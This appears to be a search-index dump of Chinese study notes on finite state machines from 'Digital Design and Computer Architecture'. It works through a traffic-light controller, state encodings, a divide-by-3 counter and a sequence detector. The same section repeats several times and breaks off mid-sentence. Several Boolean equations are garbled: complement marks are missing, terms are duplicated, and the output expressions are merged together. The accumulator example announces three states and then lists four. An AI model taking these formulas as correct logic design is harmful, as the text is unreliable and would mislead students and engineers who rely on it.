路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#341-fsm-design-example"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#步骤一明确问题背景"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#步骤二绘制状态转换图"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = 